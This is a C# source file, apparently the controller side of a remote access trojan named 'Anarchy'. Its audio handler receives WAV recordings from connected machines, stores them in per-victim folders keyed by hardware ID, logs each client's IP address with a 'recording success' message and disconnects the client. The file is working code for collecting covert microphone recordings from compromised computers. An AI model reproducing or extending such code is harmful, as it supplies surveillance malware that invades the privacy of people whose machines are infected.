using System;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;

namespace Anarchy.Handlers
{
    public class HandleAudio
    {
        public async void SaveAudio(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                string fullPath;
                fullPath = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "SaveAudio");
                if (!Directory.Exists(fullPath))
                {
                    Directory.CreateDirectory(fullPath);
                }
                await Task.Run(delegate
                {
                    File.WriteAllBytes(bytes: unpack_msgpack.ForcePathObject("WavFile").GetAsBytes(), path: fullPath + "//" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".wav");
                });
                new HandleLogs().Addmsg("Client " + client.Ip + " recording success，file located @ ClientsFolder/" + unpack_msgpack.ForcePathObject("Hwid").AsString + "/SaveAudio", Color.Purple);
                client.Disconnected();
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg("Save recorded file fail " + ex.Message, Color.Red);
            }
        }
    }
}
